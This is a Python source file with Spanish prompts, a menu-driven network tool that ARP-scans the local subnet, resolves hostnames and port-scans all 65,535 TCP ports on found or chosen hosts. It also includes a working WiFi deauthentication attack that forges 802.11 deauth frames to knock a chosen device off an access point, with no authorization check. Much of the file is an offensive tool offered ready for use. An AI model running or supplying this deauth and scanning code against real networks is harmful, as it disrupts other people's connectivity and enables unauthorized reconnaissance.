import scapy.all as scapy
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import socket
import os
import netifaces
import time

AZUL = "\033[34m"
ROJO = "\033[31m"
VERDE = "\033[32m"
NARANJA = "\033[33m"
RESET = "\033[0m"


def obtener_ip_local():
    interfaces = netifaces.interfaces()
    for interfaz in interfaces:
        if netifaces.AF_INET in netifaces.ifaddresses(interfaz):
            ip_info = netifaces.ifaddresses(interfaz)[netifaces.AF_INET][0]
            ip = ip_info["addr"]
            if ip.startswith(("192.168.", "10.", "172.")):
                return ip
    return None


def obtener_nombre(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Desconocido"


def escanear_red(ip):
    print(f"\n[+] Escaneando dispositivos en la red {ip}/24...\n")
    request = scapy.ARP(pdst=f"{ip}/24")
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    respuesta = scapy.srp(broadcast / request, timeout=2, verbose=False)[0]

    dispositivos = []
    for _, recibido in respuesta:
        ip_dispositivo = recibido.psrc
        nombre = obtener_nombre(ip_dispositivo)
        dispositivos.append({"ip": ip_dispositivo, "nombre": nombre})

    return dispositivos


def obtener_velocidad():
    print(f"{NARANJA}\nSeleccione la velocidad de escaneo:")
    print(f"{NARANJA}1. Lento (2 segundos por puerto)")
    print(f"{NARANJA}2. Rápido (0.5 segundos por puerto)")
    print(f"{NARANJA}3. Súper rápido (0.1 segundos por puerto)")
    print(f"{NARANJA}4. Ultra rápido (0.01 segundos por puerto)")
    print(RESET)
    opcion = input("Seleccione una opción: ")
    velocidades = {"1": 2, "2": 0.5, "3": 0.1, "4": 0.01}
    return velocidades.get(opcion, 0.5)


def escanear_puertos(ip, nombre):
    timeout = obtener_velocidad()
    print(f"\nEscaneando puertos en {ip} ({nombre})...\n")
    
    # Recorre todos los puertos del 1 al 65535
    for puerto in range(1, 65536):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        resultado = sock.connect_ex((ip, puerto))
        estado = "abierto" if resultado == 0 else "cerrado"
        color = VERDE if resultado == 0 else ROJO
        
        print(f"{color}{puerto} {estado} {ip} {nombre}{RESET}")
        sock.close()


def desautenticar(target_mac, ap_mac, interface, count=100):
    print(f"\n[!] Enviando {count} paquetes de deautenticación a {target_mac} desde {ap_mac} usando {interface}...\n")
    pkt = RadioTap() / \
          Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / \
          Dot11Deauth(reason=7)
    try:
        for i in range(count):
            scapy.sendp(pkt, iface=interface, verbose=0)
            print(f"[{i+1}] Paquete enviado a {target_mac}")
            time.sleep(0.1)
        print("\n[✔] ¡Desautenticación completada!\n")
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario.\n")


def menu():
    os.system("clear" if os.name != "nt" else "cls")
    print(f"""{NARANJA}
███   ███  ██████            ██████     ██     ██████    █████             █████     ████     ██     ██   ██           ██████   ███████  █████
 ███ ███   ██  ██            ██  ██   ████    █ ███ █   ██   ██           ██   ██   ██  ██   ████    ███  ██            ██  ██   ██   █   ██ ██
 ███████   ██  ██            ██  ██  ██  ██     ██     ██   ██           █        ██       ██  ██   ████ ██            ██  ██   ██ █     ██  ██
 ███████   █████             █████   ██  ██     ██     ██   ██  ██████    █████   ██       ██  ██   ██ ████  ██████    █████    ████     ██  ██
 ██ █ ██   ██ ██             ██      ██████     ██     ██   ██                ██  ██       ██████   ██  ███            ██ ██    ██ █     ██  ██
 ██   ██   ██  ██    ██      ██      ██  ██     ██     ██   ██           ██   ██   ██  ██  ██  ██   ██   ██            ██  ██   ██   █   ██ ██
 ██   ██  ████ ██    ██     ████     ██  ██    ████     █████             █████     ████   ██  ██   ██   ██           ████ ██  ███████  █████
                                                 
Versión: 1.5.0
Autor: MR.Pato
{RESET}
{AZUL}[1] Escanear dispositivos en la red (Scapy)
[2] Escanear puertos abiertos en dispositivos detectados
[3] Escanear puertos en una IP específica
[4] Desautenticar dispositivo WiFi (requiere interfaz en modo monitor)
[5] Salir{RESET}
""")


def main():
    ip_local = obtener_ip_local()
    if not ip_local:
        print("No se pudo determinar la IP local. Asegúrate de estar conectado a una red.")
        return

    dispositivos = []

    while True:
        menu()
        opcion = input("Seleccione una opción: ")

        if opcion == "1":
            dispositivos = escanear_red(ip_local)
            if dispositivos:
                print("\n[+] Dispositivos detectados:")
                for d in dispositivos:
                    print(f"    {d['ip']} - {d['nombre']}")
            else:
                print("\n[-] No se encontraron dispositivos.")
            input("\nPresione Enter para continuar...")

        elif opcion == "2":
            if not dispositivos:
                print("\n[-] Primero debe escanear los dispositivos con la opción 1.")
            else:
                print("\n[+] Escaneando puertos abiertos en todos los dispositivos detectados...\n")
                for d in dispositivos:
                    escanear_puertos(d["ip"], d["nombre"])
            input("\nPresione Enter para continuar...")

        elif opcion == "3":
            ip_objetivo = input("\nIngrese la IP que desea escanear: ")
            nombre_objetivo = obtener_nombre(ip_objetivo)
            print(f"\n[+] Escaneando puertos en {ip_objetivo} ({nombre_objetivo})...\n")
            escanear_puertos(ip_objetivo, nombre_objetivo)
            input("\nPresione Enter para continuar...")

        elif opcion == "4":
            print("\n[!] Atención: Para desautenticar, la interfaz debe estar en modo monitor.")
            interface = input("Ingrese la interfaz en modo monitor (ejemplo: wlan0mon): ").strip()
            ap_mac = input("Ingrese la MAC del punto de acceso (AP): ").strip()
            target_mac = input("Ingrese la MAC del dispositivo objetivo: ").strip()
            count = input("Ingrese la cantidad de paquetes a enviar (por defecto 100): ").strip()
            count = int(count) if count.isdigit() else 100
            desautenticar(target_mac, ap_mac, interface, count)
            input("\nPresione Enter para continuar...")

        elif opcion == "5":
            print("\nSaliendo del programa...")
            break
        else:
            print("\n[!] Opción no válida, intente de nuevo.")


if __name__ == "__main__":
    main()
